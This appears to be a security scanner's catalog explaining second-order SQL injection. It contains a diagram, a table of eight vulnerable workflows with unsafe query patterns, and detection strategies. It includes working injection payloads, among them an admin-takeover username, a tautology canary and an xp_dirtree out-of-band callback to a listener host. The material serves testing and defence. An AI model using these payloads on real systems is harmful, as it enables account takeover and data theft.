# Second-Order & Stored SQL Injection Catalog

**Document Identifier:** SENTINEL-EXH-2ND-14  
**Classification:** Multi-Stage Workflows, Persistent State Tracking & Directed Dependency Graphs  

---

## 1. Multi-Stage Ingress-to-Execution Model

Second-order SQL injection occurs when untrusted input is safely persisted into storage during an Ingress Stage ($S_1$) without executing, and subsequently retrieved and unsafely concatenated into dynamic SQL during a secondary Execution Stage ($S_2$).

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ STAGE 1: INGRESS & STORAGE                                                  │
│ Client submits payload to Ingress Endpoint A:                               │
│   POST /api/v1/users/register { "username": "admin'--" }                    │
│ Application executes parameterized INSERT:                                  │
│   INSERT INTO users (username) VALUES (?)  <-- (Safe parameterization)     │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
                                       ▼ Database stores raw: "admin'--"
┌─────────────────────────────────────────────────────────────────────────────┐
│ STAGE 2: RETRIEVAL & UNSAFE EXECUTION                                       │
│ User or Admin triggers secondary workflow on Endpoint B:                    │
│   POST /api/v1/users/change-password { "new_pass": "secret" }               │
│ Application retrieves stored username and constructs raw dynamic SQL:       │
│   UPDATE users SET pass = 'secret' WHERE username = 'admin'--'              │
│ Execution breaks out of quotes and updates administrator password!          │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Documented Real-World Workflow Dependency Graphs

| Workflow ID | Ingress Action ($S_1$) | Intermediate Persistence | Downstream Execution Endpoint ($S_2$) | Unsafe Dynamic SQL Construct | Demonstrated Security Impact |
|:---|:---|:---|:---|:---|:---|
| **`FLOW-01`** | `POST /register` | `users.username` | `POST /change-password` | `UPDATE users SET pass = '...' WHERE u = '<STORED>'` | Complete Account Takeover |
| **`FLOW-02`** | `POST /tickets` | `tickets.subject` | `GET /admin/tickets/search` | `SELECT * FROM tickets WHERE subject LIKE '%<STORED>%'` | Full Database Schema Extraction |
| **`FLOW-03`** | `POST /checkout` | `orders.shipping_address` | `GET /invoices/pdf/{id}` | `SELECT * FROM tax_rates WHERE region = '<STORED>'` | Tenant Isolation Failure |
| **`FLOW-04`** | `POST /comments` | `comments.author_name` | `GET /admin/audit-log` | `SELECT * FROM audit WHERE user = '<STORED>'` | Administrative Blind SQLi |
| **`FLOW-05`** | `PUT /organization` | `org.company_name` | `GET /analytics/monthly-report` | `SELECT SUM(revenue) FROM billing WHERE org = '<STORED>'`| Financial Data Tampering |
| **`FLOW-06`** | `POST /upload` | `files.original_filename` | `Background Celery Indexer` | `INSERT INTO search_index SELECT * WHERE fn = '<STORED>'`| Async Worker SQL Injection |
| **`FLOW-07`** | `POST /reset-password`| `password_resets.email` | `Cron Notification Dispatcher` | `SELECT * FROM templates WHERE email = '<STORED>'` | Unauthenticated Token Leak |
| **`FLOW-08`** | `GET /oauth/callback` | `oauth_users.display_name`| `GET /dashboard/team` | `SELECT * FROM team_members WHERE name = '<STORED>'` | Federated Identity Takeover |

---

## 3. Automated State Tracking & Correlation Strategies

1. **Cryptographic Traceable Canaries**:
   - Ingress injection injects unique tracking nonces: `snt_usr_a9f3' OR '1'='1`.
   - The scanner crawls and executes downstream dependency endpoints, monitoring for canary reflection or structural delta.
2. **Out-of-Band (OAST) Correlation Tokens**:
   - For background cron jobs or async workers that execute hours later, the injected payload contains a unique subdomain nonce:
     `'; EXEC master..xp_dirtree '\\snt_flow06_8b21.listener.local\a'--`
   - When the listener gateway logs the DNS query, the unique subdomain maps directly back to the original Ingress endpoint and parameter.
